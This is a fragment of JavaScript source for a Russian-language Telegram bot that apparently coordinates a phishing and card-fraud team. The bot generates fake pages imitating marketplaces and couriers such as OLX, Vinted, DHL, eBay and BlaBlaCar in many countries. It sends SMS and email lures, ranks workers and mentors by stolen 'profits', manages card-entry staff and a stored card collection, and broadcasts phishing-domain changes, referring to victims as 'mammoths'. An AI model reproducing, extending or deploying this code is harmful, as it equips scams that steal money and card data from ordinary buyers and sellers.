    if (data == '🗑 Удалить всё 🗑') {
        await receive.deleteMany({ tgID: q.from.id }).then(async (res) => {
            q.replyWithHTML(`🗑 <b>Было удалено</b> <code>${res.deletedCount}</code> <b>фейков. Спасибо, что очищаете память БД.</b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        })
    }

    /* service creator */ 
    if ((data == '🇸🇪 Blocket 2.0') || (data == '🇸🇪 Postnord 2.0') || (data == '🇸🇪 UBER 2.0') || (data == '🇵🇹 OLX 2.0') || (data == '🇵🇹 CTT 2.0') || (data == '🇵🇹 MBWAY 2.0') || (data == '🇵🇹 UBER 2.0') || (data == '🇷🇴 OLX 2.0') || (data == '🇷🇴 FanCourier 2.0') || (data == '🇮🇹 Subito 2.0') || (data == '🇮🇹 Kijiji 2.0') || (data == '🇵🇱 OLX 2.0') || (data == '🇵🇱 InPost 2.0') || (data == '🇵🇱 Vinted 2.0') || (data == '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Gumtree 2.0') || (data == '🇦🇺 Gumtree 2.0') || (data == '🇪🇸 Milanuncios 1.0') || (data == '🇪🇸 Milanuncios 2.0') || (data == '🇪🇸 Wallapop 1.0') || (data == '🇪🇸 Wallapop 2.0') || (data == '🇪🇸 Correos 2.0') || (data == '🇩🇪 Vinted 2.0') || (data == '🇪🇸 Vinted 2.0') || (data == '🇮🇹 Vinted 2.0') || (data == '🇵🇱 Vinted 2.0') || (data == '🇩🇪 Quoka 2.0') || (data == '🇩🇪 DHL 2.0') || (data == '🇩🇪 Ebay 1.0') || (data == '🇩🇪 Ebay 2.0') || (data == '🇸🇰 BAZAR.SK 2.0') || (data == '🇸🇰 DPD.SK 2.0') || (data == '🇸🇰 POSTA.SK 2.0') || (data == '🇸🇰 BAZOS.SK 2.0') || (data == '🇭🇷 POSTA.HR 2.0') || (data == '🇨🇭 POST.CH 2.0') || (data == '🇵🇹 Vinted 2.0') || (data == '🇦🇪 EmiratesPost 2.0') || (data == '🇦🇪 Dubizzle 2.0') || (data == '🏴󠁧󠁢󠁥󠁮󠁧󠁿 Wallapop 2.0') || (data == '🇮🇹 Wallapop 2.0') || (data == '🇸🇮 BOLHA.SI 2.0') || (data == '🇸🇮 POSTA.SI 2.0') || (data == '🇸🇮 SALOMON.SI 2.0') || (data == '🇸🇰 POSTA.SK 2.0') || (data == '🇦🇹 Post 2.0') || (data == '🇦🇹 Logsta 2.0') || (data == '🇦🇹 Laendleanzeiger 2.0') || (data == '🇮🇹 Subito 1.0') || (data == '🇦🇹 Post 1.0') || (data == '🇦🇹 Laendleanzeiger 1.0') || (data.includes('FedEx 2.0')) || (data == '🇮🇹 Wallapop 1.0') || (data == '🇫🇷 Wallapop 1.0') || (data == '🇫🇷 Wallapop 2.0') || (data == '🇬🇧 Wallapop 1.0') || (data == '🇮🇹 Spedire 2.0')) {
        q.scene.enter('creatorScene')
    } else if ((data.includes('BlaBlaCar 1.0')) || (data.includes('BlaBlaCar 2.0'))) {
        q.scene.enter('bbc1')
    } else if (data.includes('sendSMS')) {
        q.scene.enter('sms')
    } else if (data.includes('sms_i_sent_sms')) {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: '🟢 Отправлено 🟢', callback_data: 'zxczxczxc' }]
            ]
        })

        let res_db = await receive.findOne({ link: data.split(' ')[1] }).lean()
        if (!res_db) res_db = await bbc.findOne({ link: data.split(' ')[1] }).lean()
        await q.telegram.sendMessage(res_db.tgID, `📲 <b>Ваше SMS для ссылки с ID</b> <code>${data.split(' ')[1]}</code> <b>было успешно отправлено!</b>\n\n📬 <b>Товар:</b> ${(res_db.product_name != undefined) ? res_db.product_name : `${res_db.city_from} -> ${res_db.city_to}`}\n📬 <b>Стоимость:</b> ${(res_db.product_price != undefined) ? res_db.product_price : res_db.price}`)
    } else if (data.includes('sendEmail')) {
        q.scene.enter('email')
    }

    /* support */
    if (data.includes('userSupport')) {
        q.scene.enter('sendMessageDefault')
    }

    if (data == '📓 Наставники') {
        await teacher.find({}).lean().then(async (res) => {
            let teachers_arr = []
            teachers_arr.push(Array({ text: '💸 Стать наставником 💸', callback_data: '💸 Стать наставником 💸' }))
            for (let i = 0; i < res.length; i++) {
                teachers_arr.push(
                    Array({
                        text: `${res[i].tgUsername}`,
                        callback_data: `teacher_${res[i].tgID}`
                    })
                )
            }

            teachers_arr.push(Array({ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }))

            q.editMessageCaption('👨‍🏫 <b>Список наставников:</b>', {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: teachers_arr
                }
            })
        })
    } else if (data == '💸 Стать наставником 💸') {
        q.scene.enter('upToTeacher')
    } else if (data.includes('teacher_')) {
        await teacher.findOne({ tgID: data.split('_')[1] }).lean().then(async (res) => {
            await account.findOne({ tgID: data.split('_')[1] }).lean().then(async (res_acc) => {
                q.editMessageCaption(`👨‍🎓 <b>Наставник:</b> ${res.tgUsername}\n\n💰 <b>Сумма профитов наставника:</b> ${currency(res_acc.profit_sum_rub, { separator: ' ', symbol: '' }).format()} <b>₽</b>\n💰 <b>Сумма профитов учеников:</b> ${currency(res.profits_rub, { separator: ' ', symbol: '' }).format()} <b>₽</b>\n\n🤑 <b>Количество профитов наставника:</b> ${res_acc.total_profits}\n🤑 <b>Количество профитов учеников:</b> ${res.profits_count}\n\n💬 <b>О наставнике:</b>\n\n${res.description}`, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '👨‍🎓 Стать учеником 👨‍🎓', callback_data: `teacherGo_${data.split('_')[1]}` }],
                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                        ]
                    }
                }).catch(async (e) => {
                    loggy.warn(`problem with telegram => ${e}`)
                })
            })
        })
    } else if (data.includes('teacherGo_')) {
        await account.findOne({ tgID: q.from.id }).lean().then(async (pre_res) => {
            if (pre_res.teacher == 'Отсутствует') {
                await teacher.findOneAndUpdate({ tgID: data.split('_')[1] }, { $inc: { count: 1 } } , { new: true }).then(async (res) => {
                    await account.findOneAndUpdate({ tgID: q.from.id }, { teacher: res.tgUsername } , { new: true }).lean().then(async (res_acc) => {
                        await q.editMessageCaption(`<b>✅ Ты присоединился к куратору</b> @${res_acc.teacher}!\n<b>🔋 Напишите ему в ЛС, чтобы начать обучение.</b>`, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                                ]
                            }
                        })

                        await q.telegram.sendMessage(data.split('_')[1], `🔝 <b>У вас новый ученик</b> @${q.from.username}\n<i>Напиши ему в лс и добавь в свой чат</i>`, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: `@${q.from.username}`, url: `https://t.me/${q.from.username}` }]
                                ]
                            }
                        })
                    })
                })
            } else {
                if (pre_res.profits_with_teacher >= 5) {
                    q.editMessageCaption(`❔ Вы действительно хотите уйти от наставника ❔`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '💡 Да, хочу! 💡', callback_data: 'teacher_leave' }],
                                [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                            ]
                        }
                    })
                } else {
                    q.editMessageCaption(`<b>🚫 У вас уже есть наставник:</b> @${pre_res.teacher}! 🚫\n🚫 <b>Чтобы сменить наставника вы должны сделать 5 профитов и более с настоящим. 🚫</b>`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                            ]
                        }
                    })
                }
            }
        })
    } else if (data == 'teacher_leave') {
        await account.findOneAndUpdate({ tgID: q.from.id }, { teacher: 'Отсутствует' }, { new: true }).lean().then(async (res) => {
            q.editMessageCaption(`🗿 <b>Теперь у вас нет наставника.</b>`, {
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        })
    } else if (data.includes('accessTeacher')) {
        q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: 'Наставник принят', callback_data: 'zxcxzczxc'  }]
            ]
        })

        await q.telegram.sendMessage(data.split(' ')[1], `<b>Заполните заявку о себе для становления наставником (</b><code>ЗАЯВКА БУДЕТ ОТОБРАЖАТЬСЯ В МЕНЮ НАСТАВНИКОВ</code><b>)</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🧾 Начать заполнение', callback_data: `writeTeacher ${q.from.id}` }]
                ]
            }
        })
    } else if (data.includes('writeTeacher')) {
        q.scene.enter(`descriptionTeacer`)
    } else if (data.includes('denyTeacher')) {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: 'Отказано.', callback_data: 'denyyyy' }]
            ]
        })

        await q.telegram.sendMessage(data.split(' ')[1], `<b>Вам было отказано в становлении наставником.</b>`, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })
    }

    /* admin request moves */
    if (data.includes('✅ Принять')) {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: '✅ Принят', callback_data: 'zxczxczxc' }]
            ]
        })

        let info = data.split(' ')
        await account.insertMany({
            tgID: info[2],
            tag: require('./generateString')(6)
        }).then(async (res) => {
            await q.telegram.sendPhoto(info[2], 'https://ibb.co/fHRbJSk', {
                caption: `✅ <b>Твоя заявка была принята!</b> ✅\n<b>👨🏻‍💻 Тебе был присвоен тэг:</b> <code>#${res[0].tag}</code>`,
                parse_mode: 'HTML',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '📧 Чат', url: config.teamInfo.chat_link }, { text: '🧾 Выплаты', url: config.teamInfo.profits_channel }],
                        [{ text: '🖇 Попасть в меню!', callback_data: '⬅️ Назаддддд' }]
                    ]
                }
            })
        })
    } 
    
    if (data.includes('⛔️ Отклонить')) {
        await q.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: '⛔️ Отклонен', callback_data: 'zxczxczxc1' }]
            ]
        })

        let info = data.split(' ')
        await q.telegram.sendMessage(info[2], `🩸 <b>К сожалению, твоя заявка была отклонена 🩸</b>`, { parse_mode: 'HTML' })
    }

    /* admin panel */
    if (data == 'Добавить вбивера') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            q.scene.enter('addVbiver')
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } 
    
    if (data == 'Удалить вбивера') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            q.scene.enter('delVbiver')
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } 
    
    if (data == 'Заблокировать воркера') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            q.scene.enter('banWorker')
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } 
    
    if (data == 'Рассылка по пользователям') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            q.scene.enter('prScene')
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } 
    
    if (data == 'Рассылка по чатам') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            q.replyWithHTML(`<b>🔔 Выберите тип рассылки</b>`, {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: 'ВОРК', callback_data: `messageAll WORK` }, { text: 'СТОП', callback_data: `messageAll STOP` }],
                        [{ text: 'SMS ВОРК', callback_data: 'messageAll SMSWORK' }, { text: 'SMS СТОП', callback_data: 'messageAll SMSSTOP' }],
                        [{ text: 'Смена доменов', callback_data: `messageAll CHANGE` }],
                        [{ text: 'Общий домен', callback_data: 'messageAll domainDef' }, { text: 'Про домен', callback_data: 'messageAll domainPro' }],
                        [{ text: 'Общий+PRO домен', callback_data: 'messageAll ALLDOM' }],
                        [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                    ]
                }
            })
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } 
    
    if (data.includes('messageAll')) {
        await account.find({  }).lean().then(async (res) => {
            await q.replyWithHTML(`🔔 <b>Начинаем рассылку по</b> <code>${res.length}</code> <b>пользователям...</b>`)
            switch (data.split(' ')[1]) {
                case "WORK":
                    await q.answerCbQuery('🤖 Начинаем рассылку о старте ворка... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 FULL WORK 🟢</b>\n<b>🤑Заряду 🤑</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 FULL WORK 🟢</b>\n<b>🤑 Заряду 🤑</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 FULL WORK 🟢</b>\n<b>🤑 Заряду 🤑</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
                case "STOP":
                    await q.answerCbQuery('🤖 Начинаем рассылку о стопе ворка... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🔴 STOP WORK 🔴</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🔴 STOP WORK 🔴</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🔴 STOP WORK 🔴</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
                case "CHANGE":
                    await q.answerCbQuery('🤖 Начинаем рассылку о смене доменов... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>♻️ Смена доменов ♻️</b>\n🦣 <b>Холдите мамонтов</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>♻️ Смена доменов ♻️</b>\n🦣 <b>Холдите мамонтов</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>♻️ Смена доменов ♻️</b>\n🦣 <b>Холдите мамонтов</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
                case "SMSWORK":
                    await q.answerCbQuery('🤖 Начинаем рассылку о старте ворка SMS... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🤑Заряду 🤑</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🤑 Заряду 🤑</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🟢💌 СМС ворк 💌🟢</b>\n<b>🤑 Заряду 🤑</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }

                    break
                case "SMSSTOP":
                    await q.answerCbQuery('🤖 Начинаем рассылку о стопе ворка... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🔴💌 СМС стоп 💌🔴</b>\n<b>🔴💌 СМС стоп 💌🔴</b>\n<b>🔴💌 СМС стоп 💌🔴</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🔴💌 СМС стоп 💌🔴</b>\n<b>🔴💌 СМС стоп 💌🔴</b>\n<b>🔴💌 СМС стоп 💌🔴</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🔴💌 СМС стоп 💌🔴</b>\n<b>🔴💌 СМС стоп 💌🔴</b>\n<b>🔴💌 СМС стоп 💌🔴</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
                case "domainDef":
                    await q.answerCbQuery('🤖 Начинаем рассылку о стопе ворка... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 Общий домен обновлён! 🟢</b>\n<b>🟢 Общий домен обновлён! 🟢</b>\n<b>🟢 Общий домен обновлён! 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 Общий домен обновлён! 🟢</b>\n<b>🟢 Общий домен обновлён! 🟢</b>\n<b>🟢 Общий домен обновлён! 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 Общий домен обновлён! 🟢</b>\n<b>🟢 Общий домен обновлён! 🟢</b>\n<b>🟢 Общий домен обновлён! 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
                case "domainPro":
                    await q.answerCbQuery('🤖 Начинаем рассылку о стопе ворка... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n<b>🟢 PRO 🔱 домен обновлён! 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
                case "ALLDOM":
                    await q.answerCbQuery('🤖 Начинаем рассылку о стопе ворка... Подождите, пожалуйста...', { show_alert: true })
                    await q.telegram.sendMessage(config.bot.profits_channel, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { parse_mode: 'HTML' })
                    await q.telegram.sendMessage(-1001759957604, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { parse_mode: 'HTML' })
                    for (let i = 0; i < res.length; i++) {
                        await q.telegram.sendMessage(res[i].tgID, `⚠️ <b>Сообщение от администрации</b> ⚠️\n\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n<b>🟢 Общий и PRO домены обновлены 🟢</b>\n❕ <b>Пересоздайте ссылки</b>`, { 
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '❌ Скрыть', callback_data: 'Фэйк_profittzz' }]
                                ]
                            }
                        }).catch(async (err) => {
                            loggy.warn(`problems with sending message to all => ${err}`)
                        })
                    }
                    break
            }
        })
    } else if (data == 'Статистика проекта') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            let profits = {
                sum: 0,
                length: 0
            }

            let data = getCurrentDate()
            await cassa.find({ date: data }).lean().then(async (res) => {
                for (let i = 0; i < res.length; i++) {
                    if ((res[i].all != undefined) && (parseInt(res[i].all) != NaN)) {
                        profits.sum += parseInt(res[i].all)
                    }
                }

                profits.length = res.length
            })
            
            await account.find({}).lean().then(async (res_acc) => {
                let stats = {
                    profits_count: 0,
                    profits_sum: 0
                }
        
                for (let i = 0; i < res_acc.length; i++) {
                    stats.profits_count += res_acc[i].total_profits
                    stats.profits_sum += res_acc[i].profit_sum_rub
                }

                await receive.find({}).lean().then(async (res_fakes) => {
                    await q.replyWithHTML(`<b>~</b> 💎 <i>${config.teamInfo.name}</i> 💎 <b>~</b>\n\n<b>🙆🏻‍♂️ Кол-во воркеров:</b> <code>${res_acc.length}</code>\n<b>🛍 Кол-во фейков:</b> <code>${res_fakes.length}</code>\n\n💶 <b>Кол-во профитов:</b> <code>${stats.profits_count}</code>\n💶 <b>Общая сумма профитов:</b> <code>${currency(stats.profits_sum, { separator: ' ', symbol: '', }).format()}</code> <b>₽</b>\n\n💶 <b>Кол-во профитов за сегодня:</b> <code>${profits.length}</code>\n💶 <b>Сумма профитов за сегодня:</b> <code>${profits.sum}</code> <b>₽</b>\n\n💳 <b>Дальше больше!</b> 💳`)
                })
            })
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } else if (data == 'Сменить домен') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813)) {
            await q.replyWithHTML('<b>⚙️ Смена домена</b>', {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔰 Добавить домен', callback_data: 'domains_addDomain' }, { text: '🔋 Список доменов', callback_data: 'admin_domainsList' }],
                        [{ text: '🧑‍💻 Добавить конфиг', callback_data: 'domains_addConfig' }, { text: '🧑‍💻 Поставить защиту', callback_data: 'domains_addGuard' }]
                    ]
                }
            })
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } else if (data == 'Статистика сервера') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813)) {
            os.cpuUsage((cpu_usage) => {
                os.cpuFree((cpu_free) => {
                    os.freememPercentage((mem_free) => {
                        q.replyWithHTML(`⚙️ <b>Статистика сервер</b> ⚙️\n\n🖥 Использовано/свободно CPU: <code>${cpu_usage}</code><b>%</b> / <code>${cpu_free}</code><b>%</b>\n🖥 <b>Свободно ОЗУ:</b> <code>${mem_free}</code><b>%</b>`)
                    })
                })
            })
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } else if (data == '🗑 Почистить БД от мусора') {
        let count = 0
        await q.replyWithHTML(`<b>🗑 Начинаем очистку от мусора...</b>`)
        
        await receive.deleteMany({}).then(async (res) => {
            count += res.deletedCount
            await q.replyWithHTML(`🗑 <b>Удалено</b> <code>${res.deletedCount}</code> <b>ссылок по 2.0</b>`)
        })

        await bbc.deleteMany({}).then(async (res) => {
            count += res.deletedCount
            await q.replyWithHTML(`🗑 <b>Удалено</b> <code>${res.deletedCount}</code> <b>ссылок по BlaBlaCar</b>`)
        })

        await support.deleteMany({}).then(async (res) => {
            count += res.deletedCount
            await q.replyWithHTML(`🗑 <b>Удалено</b> <code>${res.deletedCount}</code> <b>сообщений из ТП</b>`)
        })

        await logs.deleteMany({}).then(async (res) => {
            count += res.deletedCount
            await q.replyWithHTML(`🗑 <b>Удалено</b> <code>${res.deletedCount}</code> <b>данных для редиректов мамонта (я ебал как это по другому объяснить , короче сколько раз кликали вбиверы на редиректы и куда)</b>`)
        })

        await cards.deleteMany({}).then(async (res) => {
            count += res.deletedCount
            await q.replyWithHTML(`🗑 <b>Удалено</b> <code>${res.deletedCount}</code> <b>карт</b>`)
        })

        await q.replyWithHTML(`<b>Всего было удалено записей —</b> <code>${count}</code><b>... Ахуеть...</b>`)
    } else if (data == 'admin_Users') {
        if ((q.from.id == config.bot.admin_id) || (q.from.id == 1140638587) || (q.from.id == 2132279041) || (q.from.id == 5263569624) || (q.from.id == 5276019813) || (q.from.id == 2030952071)) {
            let inline_arr = []
            inline_arr.push(Array({ text: 'Поиск по ID', callback_data: 'admin_Поиск по ID' }, { text: 'Поиск по @username', callback_data: 'admin_findUsername' }))
            inline_arr.push(Array({ text: 'Отобразить PRO Воркеров', callback_data: 'admin_lookPROWorkers' }))
            inline_arr.push(Array({ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }))

            await account.find({}).lean().then(async (res) => {
                await q.editMessageCaption(`🙆🏻‍♂️ Пользователи (всего: ${res.length})`, {
                    reply_markup: {
                        inline_keyboard: inline_arr
                    }
                })
            })
        } else {
            q.replyWithSticker('https://tlgrm.ru/_/stickers/848/be3/848be3f5-be18-426f-8d6a-18ff7f5224cb/6.webp')
        }
    } else if (data == 'admin_Поиск по ID') {
        await q.scene.enter('admin_findUser')
    } else if (data == 'admin_findUsername') {
        await q.replyWithHTML('⚙️ <b>Временно не ворк...</b>')
    } else if (data == 'admin_lookPROWorkers') {
        await account.find({ status: 'ПРО Воркер' }).lean().then(async (res) => {
            let str = `🔝 PRO Воркеры 🔝\n\n`
            let inline_arr = []

            for (let i = 0; i < res.length; i++) {
                inline_arr.push(new Array({ text: `[${i+1}] #${res[i].tag} | ${res[i].tgID}`, callback_data: `admin_getPRO ${res[i].tgID}` }))
